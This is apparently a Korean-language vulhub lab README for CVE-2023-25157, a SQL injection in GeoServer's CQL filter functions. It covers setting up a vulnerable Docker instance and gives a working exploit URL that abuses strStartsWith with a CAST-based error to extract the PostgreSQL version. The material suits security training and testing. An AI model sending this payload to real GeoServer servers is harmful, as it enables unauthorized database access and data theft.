# Whitehat School `vulhub` 한글판
# CVE-2023-25157

[중국 버전](README.zh-cn.md)

GeoServer는 지리 정보 데이터를 보고, 편집하고, 공유할 수 있는 기능을 제공하는 JAVA로 작성된 오픈 소스 소프트웨어 서비스이다. 
GIS는 지리 정보 시스템으로 데이터베이스, 웹 기반 데이터 및 개인 데이터 세트와 같은 다양한 원본의 지리 정보 데이터를 배포하기 위해 효율적인 솔루션으로 설계되었다.

2.22.1 및 2.21.4 이전 버전에서는 OGC(Open Geospatial Consortium) 표준에서 정의한 필터 및 함수 표현식에서 SQL Injection 문제가 발견되었다.

참고 :

- <https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158>
- <https://github.com/advisories/GHSA-7g5f-wrx8-5ccf>

## 취약한 환경

GeoServer 인스턴스 2.22.1을 시작하는 명령어 :
docker compose up -d


서버가 시작된 후 GeoServer의 기본 페이지를 다음 주소를 볼 수 있다 :
http://your-ip:8080/geoserver


## 익스플로잇 단계

취약점을 악용하기 전에 PostGIS 데이터 저장소를 포함하는 기존 작업 공간을 찾아야 한다. Vulhub의 GeoServer 인스턴스에는 이미 PostGIS 데이터 저장소가 있다.:

- 저장소 이름 : `vulhub`
- 데이터 저장소 이름 : `pg`
- Feature 유형 (테이블) 이름 : `example`
- Feature 유형의 속성 중 하나 : `name`

서버를 악용할 수 있는 URL :
http://your-ip:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true


![](1.png)

SQL injection을 통해 GeoServer로부터 PostgreSQL 버전이 검색된 것을 확인할 수 있다.
